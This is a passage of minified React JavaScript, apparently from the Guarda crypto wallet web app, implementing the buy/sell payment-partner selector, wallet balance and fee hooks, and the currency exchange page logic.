                }, O.createElement("h1", {
                    className: z2.choosePartnerTitle
                }, "Payment partner"), re && O.createElement(ui_message, {
                    className: Ht()(z2.message, z2.messageInfo, z2.messagePartnerError),
                    type: "info"
                }, "Unfortunately, we couldn’t find a reliable partner to process the purchase with such parameters. Please, select another cryptocurrency and try again."), !re && !G && O.createElement("div", {
                    className: Ht()(z2.choosePartnerHeader, z2.cursorPointer, z2.choosePartnerHeaderRight),
                    onClick: () => Z(!z)
                }, !N && !z && !U && 0 !== (null == f ? void 0 : f.length) && O.createElement(O.Fragment, null, (null == D ? void 0 : D.partner) === B && O.createElement("p", {
                    className: Ht()(z2.choosePartnerNotify, z2.choosePartnerNotifyMain)
                }, "Best Rate"), O.createElement("p", {
                    className: Ht()(z2.choosePartnerTitle, z2.choosePartnerTitleMain)
                }, B)), !N && !U && 0 !== (null == f ? void 0 : f.length) && O.createElement("div", {
                    dangerouslySetInnerHTML: {
                        __html: H2()
                    },
                    className: Ht()(z2.iconAccordionArrow, {
                        [z2.isShow]: !z
                    })
                })), O.createElement("div", {
                    className: z2.loaderBeforePartner
                }, O.createElement(LoaderDots, {
                    visible: G
                }))), !re && (null == f ? void 0 : f.length) > 0 && O.createElement("div", {
                    className: Ht()(z2.choosePartnerAccWrapper, {
                        [z2.isShow]: z
                    })
                }, null == le ? void 0 : le.map(( (e, t) => O.createElement(e.Component, {
                    key: t
                }))), !(null != V && null !== (t = V.simplex) && void 0 !== t && t.estimate) && !(null != V && null !== (a = V.guardarian) && void 0 !== a && a.estimate) && ((0,
                Ko.lt)(R, null == o ? void 0 : o.min) || (0,
                Ko.gt)(R, null == o ? void 0 : o.max)) && O.createElement(O.Fragment, null, O.createElement(ChooseSimplex, {
                    side: l,
                    choosenPartner: B,
                    changePartner
                }), O.createElement(ChooseGuardarian, {
                    side: l,
                    choosenPartner: B,
                    changePartner
                })))), (0,
                M.d)() && O.createElement("div", {
                    className: z2.desktopInfo
                }, O.createElement("p", {
                    className: z2.notify
                }, "Optimal purchase rate starts for amounts from", " ", (0,
                Ko.yF)(m), " ", "buy" === l ? null == H ? void 0 : H.icon : (null == _ || null === (n = _.ticker) || void 0 === n ? void 0 : n.toUpperCase()) || (null == _ || null === (r = _.currency) || void 0 === r ? void 0 : r.toUpperCase()), ". ", O.createElement("br", null), "Choose the currency of your card to reduce the bank fee (if available)."), O.createElement("div", {
                    className: z2.buyNotifyText
                }, O.createElement("div", {
                    dangerouslySetInnerHTML: {
                        __html: $2()
                    },
                    className: z2.iconClock
                }), O.createElement("div", {
                    className: z2.buyNotifyTextItem
                }, "Estimated arrival: ", "buy" === l ? "10 - 30 mins" : "1-3 business days"))), O.createElement("div", {
                    className: z2.buyNotify
                }, O.createElement("div", {
                    className: z2.footerButtons
                }, O.createElement("div", {
                    className: z2.networkError
                }, O.createElement(ErrorText, {
                    online: L,
                    isPartnerError: Boolean(u && !k)
                })), O.createElement(Yl, {
                    id: X,
                    color: "blue",
                    size: "big",
                    className: z2.buttonBuySell,
                    disabled: G || i || C || U && !k,
                    onClick: d
                }, l))))
            }
            ))))), O.createElement(aa, {
                className: z2.popupWrapper,
                visible: x
            }, O.createElement(J, {
                closePopup: I,
                paymentId: null == d ? void 0 : d.paymentId
            })), O.createElement("input", {
                id: "buyAmountInUsd",
                type: "hidden",
                name: "amountInUsd",
                value: (0,
                Ko.FH)((0,
                Ko.hC)(R, u(1, F)), {
                    max: 4
                })
            }))))
        }
          , L4 = a.p + "289b116ac0c6baa28ef0321daa4721a3.svg"
          , F4 = a.p + "79574bd330497dacd8c1d22b6382c6a9.svg"
          , W4 = a.p + "d9d481683af149abaf52ab9d61e059a8.svg"
          , useLimitsWallet = e => {
            var t;
            let {wallet: a, feeWallet: n, toWallet: r} = e;
            const [l,s] = (0,
            O.useState)(null !== (t = null == a ? void 0 : a.balance) && void 0 !== t ? t : "0")
              , [i,o] = (0,
            O.useState)(!0)
              , c = (null == a ? void 0 : a.currency) === (null == n ? void 0 : n.currency)
              , [u,,d,,m,p] = use_fee(a, r || a, (0,
            Ko.y4)(null == a ? void 0 : a.balance), {
                totalBalance: null == n ? void 0 : n.balance
            }, "exchange");
            (0,
            O.useEffect)(( () => {
                if (void 0 !== a) {
                    s(a.balance);
                    if (null !== n && void 0 !== r) {
                        o(!0);
                        (async () => {
                            if (a && !d) {
                                let e = "";
                                if (a && a.getAvailableBalance) {
                                    e = await a.getAvailableBalance();
                                    c && u && !p && (e = (0,
                                    Ko.h9)(e, u).toString());
                                    (0,
                                    Ko.G)(e, 0) && (e = "0");
                                    (0,
                                    Ko.gt)(e, a.balance) && (e = a.balance);
                                    s(e);
                                    o(!1);
                                    return
                                }
                                e = a.balance;
                                c && u && (e = (0,
                                Ko.h9)(e, u).toString());
                                (0,
                                Ko.G)(e, 0) && (e = "0");
                                (0,
                                Ko.gt)(e, a.balance) && (e = a.balance);
                                s(e);
                                o(!1)
                            }
                        }
                        )()
                    }
                }
            }
            ), [null == a ? void 0 : a.balance, n, u, d, a, c, p]);
            if (a) {
                const e = undefined
                  , t = ((0,
                be.II)(a.currency) || {}).precision || 8
                  , n = undefined
                  , r = undefined;
                return [l, (a && a.data ? a.data.precision : null) || t, i, m, u]
            }
            return [l, 0, i, m, u]
        }
          , useWalletsFrom = () => {
            const e = (0,
            $.v9)($c)
              , t = (0,
            O.useMemo)(( () => [...e].filter((e => !("eos" === e.currency && !e.accountName))).filter((e => {
                var t;
                return !1 !== (null === (t = Se.Z.getRootMetadata(e.currency)) || void 0 === t ? void 0 : t.coin.features.isActiveExchange)
            }
            )).filter((e => !e.isTestnet)).filter((e => !e.isWatchOnly))), [e]);
            return t
        }
          , R4 = useWalletsFrom;
        function create_list_of_tokens(e, t, a) {
            const n = a.filter((e => e.family === t)).map((e => e.ticker));
            return e.filter((e => {
                if ("trx" === t && "btc" === e.ticker || e.family !== t)
                    return !1;
                if (!n.includes(e.ticker))
                    return !1;
                e.title || (e.title = e.ticker);
                return !0
            }
            )).sort(( (e, t) => e.ticker > t.ticker ? 1 : -1))
        }
        const use_wallets_to_getNewTokensForExchange = (e, t) => {
            const a = {};
            e.subWallets.forEach((e => {
                a[(0,
                be.rX)(e.currency)] = !0
            }
            ));
            return t.subWallets.filter((e => {
                const t = (0,
                be.rX)(e.currency);
                if (a[t])
                    return !1;
                a[t] = !0;
                return !0
            }
            ))
        }
          , useWalletsTo = e => {
            const t = (0,
            $.v9)(Fi)
              , a = (0,
            $.v9)(xi)
              , n = (0,
            $.v9)($c)
              , {supportedTokensList: r, supportedCoinsList: l} = (0,
            O.useMemo)(( () => {
                const t = []
                  , a = [];
                e.forEach((e => {
                    var n, r;
                    (null === (n = e.ticker) || void 0 === n ? void 0 : n.toLowerCase()) !== (null === (r = e.currency) || void 0 === r ? void 0 : r.toLowerCase()) || e.smartContract || e.family ? t.push(e) : a.push(e)
                }
                ));
                return {
                    supportedTokensList: t,
                    supportedCoinsList: a
                }
            }
            ), [e])
              , s = n.filter((e => {
                var t;
                return (null === (t = Se.Z.getRootMetadata(e.currency)) || void 0 === t ? void 0 : t.coin.features.isActiveExchange) && !e.isTestnet
            }
            ))
              , i = new Set(s.map((e => {
                var t;
                return null === (t = e.currency) || void 0 === t ? void 0 : t.toLowerCase()
            }
            )))
              , o = (0,
            O.useMemo)(( () => l.filter((e => {
                var t, a;
                return !i.has((null === (t = e.ticker) || void 0 === t ? void 0 : t.toLowerCase()) || (null === (a = e.currency) || void 0 === a ? void 0 : a.toLowerCase()) || "")
            }
            ))), [l, i]);
            if (!t || !t.length)
                return {
                    toWallets: s,
                    newTokens: [],
                    newCoins: []
                };
            const c = []
              , u = [];
            o.forEach((e => {
                const t = undefined
                  , a = (new (_e.ZP.getClass({
                    currency: e.currency
                }))).recoverFromPlainObject({
                    uuid: (0,
                    he.Z)().slice(0, 8),
                    ticker: e.currency,
                    title: e.title,
                    currency: e.currency
                });
                u.push(a)
            }
            ));
            s.forEach((e => {
                const t = undefined
                  , n = fake_to_real_wallet_fakeSubWalletsForTokens(e, create_list_of_tokens(r, e.currency, a))
                  , l = use_wallets_to_getNewTokensForExchange(e, n);
                c.push(...l)
            }
            ));
            const d = new Set(o.map((e => {
                var t;
                return null === (t = e.currency) || void 0 === t ? void 0 : t.toLowerCase()
            }
            )));
            r.forEach((e => {
                var t;
                const a = null === (t = (null == e ? void 0 : e.family) || (null == e ? void 0 : e.network)) || void 0 === t ? void 0 : t.toLowerCase()
                  , n = undefined;
                if (d.has(a)) {
                    const t = undefined
                      , n = (new (_e.ZP.getClass({
                        currency: a
                    }))).recoverFromPlainObject({
                        uuid: (0,
                        he.Z)().slice(0, 8),
                        ticker: a,
                        title: a,
                        currency: a
                    })
                      , r = fake_to_real_wallet_fakeSubWalletsForTokens(n, [e])
                      , l = use_wallets_to_getNewTokensForExchange(n, r);
                    c.push(...l)
                }
            }
            ));
            return {
                newTokens: c,
                toWallets: s,
                newCoins: u
            }
        }
        ;
        let B4;
        !function(e) {
            e.minus = "minus";
            e.plus = "plus"
        }(B4 || (B4 = {}));
        const use_minimal_balance_useMinimalBalanceCheck = e => {
            const {wallet: t, estimate: a, operationType: n} = e
              , [r,l] = (0,
            O.useState)("0")
              , [s,i] = (0,
            O.useState)(!1);
            (0,
            O.useEffect)((function onSetRequiredBalanceWarning() {
                async function start() {
                    i(!1);
                    if (n === B4.minus && "sol" !== (null == t ? void 0 : t.currency))
                        return;
                    const e = await Se.Z.getApiByCurrency(null == t ? void 0 : t.currency);
                    if (!e || !e.getMinimalBalance)
                        return;
                    const r = await e.getMinimalBalance({
                        address: null == t ? void 0 : t.address
                    });
                    if ("0" === r)
                        return;
                    let s;
                    s = n === B4.minus ? (0,
                    Ko.lt)((0,
                    Ko.h9)(null == t ? void 0 : t.balance, (0,
                    Ko.yF)(a)), r) : (0,
                    Ko.lt)((0,
                    Ko.PD)(null == t ? void 0 : t.balance, (0,
                    Ko.yF)(a)), r);
                    l(r);
                    i(s)
                }
                t && start()
            }
            ), [a, n, t]);
            return (0,
            O.useMemo)(( () => ({
                isWarning: s,
                minimalBalance: r
            })), [s, r])
        }
          , ExchangeRateInfo = e => {
            var t, a;
            let {fromWallet: n, toWallet: r, feeWallet: l, fee: s, estimate: i, parentWalletTitle: o, resource: c, amount: u, notShowValues: d, isFeeError: m} = e;
            const {convertToFiat: p} = useConverter()
              , f = !c && n && n.currency === (null == l ? void 0 : l.currency)
              , E = (0,
            O.useMemo)(( () => (0,
            M.tq)() || (0,
            M.p1)() ? f ? "-18px" : "-79px" : f ? "-21px" : "-96px"), [f])
              , h = (0,
            O.useMemo)(( () => i && u ? (0,
            Ko.hC)(i, u).toString() : null), [i]);
            return O.createElement("div", {
                className: m2
            }, O.createElement(misk_info, {
                className: p2
            }, O.createElement(MiskInfoTitle, {
                className: c2
            }, "Exchange rate:"), h && !d && n && r ? O.createElement(MiskInfoValue, {
                className: u2
            }, O.createElement(O.Fragment, null, O.createElement("span", {
                className: n2
            }, "1 ", (0,
            be.xG)(n.currency), " ~ "), O.createElement("span", {
                className: n2
            }, (0,
            Ko.yF)(h, 8)), " ", (0,
            be.xG)(r.currency))) : "-"), O.createElement(misk_info, {
                className: f2
            }, O.createElement(MiskInfoTitle, {
                className: c2
            }, "trx" === (null == n || null === (t = n.data) || void 0 === t ? void 0 : t.family) && "trx" !== (null == n || null === (a = n.data) || void 0 === a ? void 0 : a.currency) ? "Estimated network fee" : "Network fee", ":"), d || !l || m ? "-" : O.createElement(MiskInfoValue, {
                className: u2
            }, O.createElement("span", {
                className: n2
            }, (0,
            Ko.yF)(null != s ? s : "0")), " ", c && (0,
            be.iX)(c) || (0,
            be.xG)(l.currency), !c && O.createElement(O.Fragment, null, " ~ ", O.createElement(fiat_estimate_FiatEstimate, {
                value: p(s, l),
                renderCurrency: !0,
                isRate: !0
            })), O.createElement("span", {
                className: a2
            }, O.createElement(tooltip, {
                text: f ? "Excluded" : `Will be charged from wallet: ${(0,
                be.Ui)(o || "", 3)} ${null == l ? void 0 : l.address.slice(-4)}`,
                width: "max-content",
                classNameTooltip: t2,
                left: E
            }, O.createElement("div", {
                className: e2
            }))))))
        }
          , getParentWalletTitle = e => {
            let {fromWallet: t, feeWallet: a, getParent: n} = e;
            if (["ont", "neo", "vet"].includes((null == t ? void 0 : t.currency) || "") || ["ont", "neo", "vet"].includes((null == t ? void 0 : t.family) || "")) {
                const e = a ? n(a.uuid) : void 0;
                return null == e ? void 0 : e.title
            }
            if (a)
                return a.title
        }
          , O4 = "fee-cover_updateBalanceLink_rytKW"
          , FeeCover = e => {
            let {wallet: t} = e;
            return O.createElement(ui_message, {
                type: "info"
            }, "Not enough ", t.balance, " ", (0,
            be.xG)(t.currency), " to pay the miner’s fee. Never mind, we like things to go smoothly. We will cover the fee for you.", O.createElement("br", null), O.createElement("a", {
                href: "https://support.guarda.com/exchange/not-enough-funds-for-an-exchange",
                className: O4,
                target: "_blank",
                rel: "noreferrer noopener"
            }, "How it works"))
        }
        ;
        FeeCover.propTypes = {
            wallet: as().object
        };
        const D4 = FeeCover;
        var M4 = a(97177);
        const patchAddressForExchangeByWallet = async (e, t, a) => {
            if (!e)
                return null;
            if ("bsv" === e.currency) {
                const n = undefined;
                return (await Se.Z.getApiByCurrency("bsv")).toConvertAddress({
                    type: "legacy",
                    address: a === M4.xS.TYPE_EXCHANGE_ADDRESS ? t : e.address
                })
            }
            return a === M4.xS.TYPE_EXCHANGE_ADDRESS ? t : e.address
        }
        ;
        let U4, G4;
        !function(e) {
            e[e.WAIT_FOR_EXCHANGE = 0] = "WAIT_FOR_EXCHANGE";
            e[e.CREATING_EXCHANGE_TX = 1] = "CREATING_EXCHANGE_TX";
            e[e.CREATING_DUSTER_INVOICE = 2] = "CREATING_DUSTER_INVOICE";
            e[e.SHOW_CAPTCHA = 3] = "SHOW_CAPTCHA";
            e[e.WAIT_DUSTER_CONFIRM = 4] = "WAIT_DUSTER_CONFIRM";
            e[e.SHOW_NEXT_PAGE = 5] = "SHOW_NEXT_PAGE";
            e[e.SENDING_ASSETS = 6] = "SENDING_ASSETS"
        }(U4 || (U4 = {}));
        !function(e) {
            e.OK = "OK";
            e.BAD_PARAMS = "BAD_PARAMS";
            e.FORBIDDEN = "FORBIDDEN"
        }(G4 || (G4 = {}));
        const patchCurrencyForNotification = (e, t) => "usdt" === e && t && "eth" === t.family ? "usdterc20" : e
          , validateMaxAmount = (e, t) => !!eq(t, "0") || lte(fixedAmount(e), t)
          , handleCaptcha = (e, t) => {
            if (t && e) {
                t(Fu.setExchangeCaptcha(e));
                t(Fu.setMainPageStep(U4.WAIT_DUSTER_CONFIRM))
            }
        }
          , checkDeactivatedWallet = (e, t) => {
            const {family: a, currency: n} = e
              , r = undefined;
            return !!t.find((e => e.currency === n && e.family === a))
        }
          , createExchangeTx = async e => {
            let {fromWallet: t, toWallet: a, feeWallet: n, isLoadingFee: r, isFeeError: l, fee: s, creatingExchangeTx: i, amount: o, partner: c, dispatch: u, isWithDuster: d, addressTo: m, exchangeType: p, quotaId: f, resource: E, amountOutMin: h} = e;
            if (!t || !a || !n || r || l || !s && 0 !== s || i || p === M4.xS.TYPE_EXCHANGE_ADDRESS && !m)
                return;
            const {currency: g, family: y=t.currency} = Gl("changenow", {
                family: t.family || t.currency,
                currency: t.currency
            })
              , {currency: v, family: _=a.currency} = Gl("changenow", {
                family: a.family || a.currency,
                currency: a.currency
            })
              , w = await patchAddressForExchangeByWallet(a, m, p)
              , b = (0,
            Ko.gt)((0,
            Ko.PD)(o, s), t.balance) ? (0,
            Ko.h9)(t.balance, s) : o
              , k = (0,
            Ko.gt)(o, t.balance) ? t.balance : o
              , S = undefined
              , C = (null == n ? void 0 : n.currency.toLowerCase()) === (null == t ? void 0 : t.currency.toLowerCase()) && (0,
            Ko.gt)(b, 0) && !E ? b : k
              , N = {
                fromCurrency: M4.eH.includes(g.toLowerCase()) ? g.toLowerCase() : (0,
                be.xG)(g).toLowerCase(),
                fromNetwork: M4.eH.includes(y.toLowerCase()) ? y.toLowerCase() : (0,
                be.xG)(y).toLowerCase(),
                toCurrency: M4.eH.includes(v.toLowerCase()) ? v.toLowerCase() : (0,
                be.xG)(v).toLowerCase(),
                toNetwork: M4.eH.includes(_.toLowerCase()) ? _.toLowerCase() : (0,
                be.xG)(_).toLowerCase(),
                fromAmount: (0,
                Ko.y4)(C),
                addressFrom: t.address,
                address: a.accountName || w,
                label: "app",
                partner: c,
                isWithDuster: d,
                fee: s,
                amountOutMin: h
            }
              , T = await u(getSecureData("uuid"));
            T && Object.assign(N, {
                uuid: T
            });
            f && Object.assign(N, {
                quotaId: f
            });
            await u(Fu.createTransaction(N))
        }
          , createOrderInfoFunction = async e => {
            let {fromCurrency: t, fromNetwork: a, toCurrency: n, toNetwork: r, fromAmount: l, address: s, addressFrom: i, hash: o, fee: c, partner: u, amountOutMin: d, dispatch: m} = e;
            if (!(t && a && n && r && l && s && i && o && c && u && d))
                return "ErrorOfValues";
            const p = {
                fromCurrency: M4.eH.includes(t.toLowerCase()) ? t.toLowerCase() : (0,
                be.xG)(t).toLowerCase(),
                fromNetwork: M4.eH.includes(a.toLowerCase()) ? a.toLowerCase() : (0,
                be.xG)(a).toLowerCase(),
                toCurrency: M4.eH.includes(n.toLowerCase()) ? n.toLowerCase() : (0,
                be.xG)(n).toLowerCase(),
                toNetwork: M4.eH.includes(r.toLowerCase()) ? r.toLowerCase() : (0,
                be.xG)(r).toLowerCase(),
                fromAmount: (0,
                Ko.y4)(l),
                address: s,
                addressFrom: i,
                refundAddress: s,
                hash: o,
                fee: c,
                partner: u,
                label: "app",
                amountOutMin: d
            }
              , f = await m(getSecureData("uuid"));
            f && Object.assign(p, {
                uuid: f
            });
            await m(Fu.createOrderInfoG(p));
            return "FunctionEnded"
        }
          , formatTicker = e => (0,
        be.xG)(e).toUpperCase()
          , formatNumberPosition = e => {
            if ("" === e || void 0 === e)
                return "";
            if ("." === e[e.length - 1]) {
                const t = e.split(".")[0];
                return (0,
                Ko.yF)(t) + "."
            }
            if ("0" === e[e.length - 1] && e.includes(".")) {
                const [t,a] = e.split(".");
                return (0,
                Ko.yF)(t) + "." + a
            }
            return (0,
            Ko.yF)(e)
        }
          , removeTrailingZero = e => {
            const t = (e = e.toString()).split(".");
            t[0] = t[0].replace(/^0+/, "");
            return t.join(".")
        }
          , toFormatInputNumber = e => {
            const t = e.toString().replaceAll(/\s/g, "");
            return "." === t || "0" === t[0] && 1 === t.indexOf(".") && "" === t.slice(2) ? "0" : "." === t[0] ? (0,
            Ko.y4)(`0${t}`) : (0,
            Ko.y4)(t)
        }
          , useExchangeEstimateAndLimits = e => {
            let {fromWallet: t, toWallet: a, amount: n, exchangeInfo: r} = e;
            const l = (0,
            $.I0)();
            (0,
            O.useEffect)(( () => {
                if (void 0 === t || void 0 === a || void 0 === n)
                    return;
                const e = toFormatInputNumber(n);
                if (isNaN(Number(e)) || "0" === e || "" === e)
                    l(Fu.setExchangeInfo({
                        ...r,
                        isLoading: !1,
                        estimate: ""
                    }));
                else {
                    l(Fu.setExchangeInfo({
                        ...r,
                        isLoading: !0
                    }));
                    l(Fu.fetchExchangeInfo({
                        fromWallet: t,
                        toWallet: a,
                        amount: e
                    }))
                }
            }
            ), [t, a, n])
        }
          , getRefData = async e => {
            let {dispatch: t, setIsRefLinkActivated: a, setLinkId: n} = e;
            const r = await t(getSecureData(at))
              , l = null == r ? void 0 : r.isActivated
              , s = null == r ? void 0 : r.referralId;
            l && a(l);
            s && n(s)
        }
          , handleDustTransaction = async e => {
            let {txStart: t, exchangeTransaction: a, toWallet: n, detailsPageParams: r, fee: l, fromWallet: s, feeWallet: i, captchaCode: o, feeExtraData: c, dispatch: u} = e;
            const d = {
                address: null == a ? void 0 : a.payinAddress,
                currency: null == n ? void 0 : n.currency
            };
            let m = {
                amount: r.amount,
                isFeeIncluded: !0,
                extraId: null == a ? void 0 : a.payinExtraId,
                estimate: r.estimate,
                fee: l,
                exchangeId: r.exchangeId,
                invoiceId: r.invoiceId
            };
            const p = await tM.preprocessDustExchange(s, d, i, m, o);
            if (p.error) {
                u(Fu.addExchangeStatusToHistory(di));
                return
            }
            m = Object.assign(m, p);
            c && (m = Object.assign(m, c));
            const f = await tM.dustExchange(s, d, i, m);
            try {
                await u(updateExchangeTx(r.exchangeId, {
                    payinHash: f.hash,
                    amountTo: r.estimate,
                    dustInvoiceId: r.invoiceId
                }))
            } catch (e) {}
            await u(fetchExchangeTransactions());
            if (f.error) {
                u(Fu.addExchangeStatusToHistory(di));
                return
            }
            const E = `${null == s ? void 0 : s.currency}/${null == n ? void 0 : n.currency}`
              , h = cc.$.txPerformanceEnd(t);
            cc.$.send(cc.d.PERFORMANCE_TX_EXCHANGE_DUST, E, `${h} ms`)
        }
          , checkIsTransactionFinished = e => {
            for (let t = 0; t < e.length; t++)
                if (-1 !== ["finished", "expired", "refund"].indexOf(e[t]))
                    return !0;
            return !1
        }
          , isCurrentStatusFailed = (e, t) => {
            if (!t.includes(e) || !t.includes(di))
                return !1;
            const a = t.indexOf(e)
              , n = t.indexOf(di);
            return !!(0,
            Ko.eq)((0,
            Ko.h9)(n, a), 1)
        }
          , V4 = "0"
          , ExchangeMainPage_ExchangeMainPage = () => {
            var e, t, a, n, r, l;
            const s = (0,
            $.I0)()
              , i = (0,
            j.k6)()
              , o = O.createRef()
              , c = useLocationSearch()
              , u = (0,
            $.v9)(Zi)
              , d = (0,
            $.v9)($i)
              , {limits: m, estimate: p, isSupportedPair: f, isLoading: E, quotaId: h, amountOutMin: g} = d
              , y = (0,
            $.v9)(Pi)
              , v = (0,
            $.v9)(tu)
              , _ = (0,
            $.v9)(xi)
              , w = (0,
            $.v9)(Li)
              , [b,k] = (0,
            O.useState)(M4.xS.TYPE_EXCHANGE_WALLET)
              , [S,C] = (0,
            O.useState)(!1)
              , N = (0,
            $.v9)($c)
              , T = (0,
            $.v9)(eu)
              , A = (0,
            O.useMemo)(( () => "swft" === y), [y])
              , [x,I] = (0,
            O.useState)(!1)
              , [P,L] = (0,
            O.useState)(!1)
              , [F,W] = (0,
            O.useState)(!1);
            (0,
            O.useEffect)(( () => {
                A && !1 !== P && I(!1)
            }
            ), [P]);
            const R = (0,
            O.useMemo)(( () => {
                const e = N.find((e => "btc" === e.currency));
                return null != e ? e : N[0]
            }
            ), [N])
              , B = null !== (e = (0,
            $.v9)(Vi)) && void 0 !== e ? e : R
              , D = null !== (t = (0,
            $.v9)(Gi)) && void 0 !== t ? t : R
              , U = null !== (a = (0,
            $.v9)(qi)) && void 0 !== a ? a : V4;
            (0,
            O.useEffect)(( () => {
                W(!1)
            }
            ), [B, D, U]);
            const {createNewCoinOrToken: G} = useCreateWalletAndGoTo({
                noDownloadBackup: !0
            })
              , setFromWallet = e => {
                s(Fu.setWalletFrom(e))
            }
              , setToWallet = async e => {
                if (null !== e) {
                    const t = T(e.parentUuid)
                      , a = await createNewWalletInSelector({
                        wallet: e,
                        setLoadingSelector: C,
                        createNewCoinOrToken: G,
                        parentWallet: t
                    });
                    s(Fu.setWalletTo(a))
                }
            }
              , setAmount = e => {
                s(Fu.setAmount(e))
            }
              , V = (0,
            O.useRef)(!1);
            (0,
            O.useMemo)(( () => {
                if (!0 !== V.current && void 0 !== (null == v ? void 0 : v.uuid)) {
                    void 0 === c.amount && setAmount(V4);
                    void 0 === c.walletFrom && setFromWallet(v);
                    V.current = !0
                }
            }
            ), [null == v ? void 0 : v.uuid]);
            (0,
            O.useMemo)(( () => {
                if (c.walletFrom) {
                    var e;
                    const t = null !== (e = T(c.walletFrom)) && void 0 !== e ? e : R;
                    setFromWallet(t)
                }
                if (c.walletTo) {
                    var t;
                    const e = null !== (t = T(c.walletTo)) && void 0 !== t ? t : R;
                    setToWallet(e)
                }
                c.amount && setAmount(c.amount)
            }
            ), [c]);
            const [K,H] = (0,
            O.useState)(!1)
              , [z,Z] = (0,
            O.useState)(!1)
              , [Y] = fee_wallet(D)
              , q = (0,
            $.v9)(Fi)
              , [X,Q,J,,ee,te] = use_fee(D, B, (0,
            Ko.y4)(U), {
                totalBalance: null == Y ? void 0 : Y.balance
            }, "exchange")
              , [ae,ne,,re,le] = useLimitsWallet({
                wallet: D,
                feeWallet: Y,
                toWallet: B
            })
              , {isWarning: se} = use_minimal_balance_useMinimalBalanceCheck({
                wallet: D,
                estimate: U,
                operationType: B4.minus
            })
              , {isWarning: ie, minimalBalance: oe} = use_minimal_balance_useMinimalBalanceCheck({
                wallet: B,
                estimate: p,
                operationType: B4.plus
            });
            (0,
            O.useEffect)(( () => {
                s(Fu.fetchExchangeCurrencies())
            }
            ), []);
            const [ce,ue] = (0,
            O.useState)(5)
              , [de,me] = (0,
            O.useState)(!1)
              , pe = (0,
            O.useRef)()
              , fe = (0,
            $.v9)(Oi)
              , Ee = (0,
            $.v9)(Di)
              , he = (0,
            $.v9)(Ri)
              , ge = (0,
            $.v9)(Ui)
              , ye = (0,
            $.v9)(Mi)
              , ve = (0,
            O.useMemo)(( () => (ge === U4.CREATING_EXCHANGE_TX || ge === U4.CREATING_DUSTER_INVOICE || ge === U4.SHOW_NEXT_PAGE || ge === U4.SENDING_ASSETS) && !fe || x && A), [fe, ge])
              , _e = (0,
            O.useMemo)(( () => (ge === U4.SHOW_CAPTCHA || ge === U4.WAIT_DUSTER_CONFIRM) && !fe), [fe, ge])
              , [we,ke] = (0,
            O.useState)(!1)
              , [Ce,Ne] = (0,
            O.useState)(!1)
              , [Te,Ae] = (0,
            O.useState)(!1)
              , {convertToFiat: xe} = useConverter()
              , Ie = (0,
            $.v9)(lu)
              , Pe = R4()
              , Le = (0,
            $.v9)(ji)
              , {sortByRank: Fe} = useCMCRate()
              , We = (0,
            O.useMemo)(( () => Le.sort(Fe)), [Le, Fe])
              , {toWallets: Re, newTokens: Be, newCoins: Oe} = useWalletsTo(We)
              , De = (0,
            O.useMemo)(( () => (0,
            M.tq)() || (0,
            M.p1)()), []);
            useExchangeEstimateAndLimits({
                fromWallet: D,
                toWallet: B,
                amount: U,
                exchangeInfo: d
            });
            const Me = (0,
            $.v9)(Bi)
              , [Ue,Ge] = (0,
            O.useState)(c.addressTo || "")
              , [Ve,Ke] = (0,
            O.useState)(!1)
              , [He,ze] = (0,
            O.useState)(!1)
              , [je,$e] = (0,
            O.useState)(!1)
              , [Ze,Ye] = (0,
            O.useState)(!1)
              , qe = (0,
            O.useMemo)(( () => {
                var e;
                const t = (null == B ? void 0 : B.currency) || (null == B ? void 0 : B.ticker) || "...";
                return null != B && B.family ? `Enter ${t.toUpperCase()} (${null == B || null === (e = B.family) || void 0 === e ? void 0 : e.toUpperCase()}) address` : `Enter ${t.toUpperCase()} address`
            }
            ), [B])
              , Xe = (0,
            O.useMemo)(( () => de ? "exchange-undo" : b === M4.xS.TYPE_EXCHANGE_ADDRESS ? "exchange-create-address" : "exchange-create"), [b, de])
              , [Qe,Je] = (0,
            O.useState)(null)
              , [et,tt] = (0,
            O.useState)(c.addressToTitle ? c.addressTo : null)
              , [at,nt] = (0,
            O.useState)(!1)
              , rt = (0,
            O.useCallback)((e => {
                Ge(e);
                Ye(!1)
            }
            ), [])
              , st = (0,
            O.useCallback)((e => Ke(e)), [])
              , it = (0,
            O.useCallback)((e => ze(e)), [])
              , ot = (0,
            O.useCallback)((e => nt(e)), [])
              , ct = (0,
            O.useCallback)((e => {
                if (e.error) {
                    tt(null);
                    Je(e.error);
                    Ke(!1)
                } else if (void 0 !== e.address) {
                    Je(null);
                    tt(e.address);
                    Ke(!0)
                } else
                    tt(null)
            }
            ), []);
            (0,
            O.useEffect)((function onSetExchangeAssetsList() {
                s(Fu.createExchangeAssetsList())
            }
            ), [_, q]);
            (0,
            O.useEffect)(( () => {
                K && H(!1);
                Z(!1);
                B && Ne(checkDeactivatedWallet(B, M4.c1.to));
                D && ke(checkDeactivatedWallet(D, M4.c1.from))
            }
            ), [null == D ? void 0 : D.uuid, null == B ? void 0 : B.uuid, U]);
            const ut = O.useCallback((e => {
                setToWallet(e);
                b === M4.xS.TYPE_EXCHANGE_ADDRESS && Ye(!1)
            }
            ), [setAmount, setToWallet])
              , dt = O.useCallback((e => {
                if (e.uuid !== (null == D ? void 0 : D.uuid)) {
                    setAmount(V4);
                    setFromWallet(e);
                    s(setActiveWallet(e));
                    s(Fu.setMainPageStep(U4.WAIT_FOR_EXCHANGE))
                }
            }
            ), [s, setAmount, setFromWallet])
              , mt = O.useCallback(( () => {
                if (!0 !== (null == B ? void 0 : B.watchOnly) && void 0 !== B) {
                    L(!1);
                    p && setAmount(formatNumberPosition(p));
                    D && setToWallet(D);
                    setFromWallet(B);
                    s(Fu.setMainPageStep(U4.WAIT_FOR_EXCHANGE));
                    b === M4.xS.TYPE_EXCHANGE_ADDRESS && Ye(!1)
                }
            }
            ), [D, setFromWallet, B, setToWallet]);
            function handleSetAllAmount() {
                L(!1);
                setAmount(formatNumberPosition(ae.toString()))
            }
            function handleChangeAmount(e) {
                L(!1);
                setAmount(e || V4);
                s(Fu.setMainPageStep(U4.WAIT_FOR_EXCHANGE))
            }
            function handleRetryLoadAdapter() {
                ze(!1);
                $e(!1)
            }
            const pt = (0,
            O.useCallback)(( () => b === M4.xS.TYPE_EXCHANGE_WALLET ? "To address" : "To My Wallet"), [b])
              , ft = (0,
            O.useCallback)(( () => {
                L(!1);
                Ge("");
                Ye(!1);
                const e = b === M4.xS.TYPE_EXCHANGE_WALLET ? M4.xS.TYPE_EXCHANGE_ADDRESS : M4.xS.TYPE_EXCHANGE_WALLET;
                k(e)
            }
            ), [b, B]);
            function handleUndoExecution() {
                clearInterval(pe.current);
                me(!1);
                ue(5)
            }
            const Et = (0,
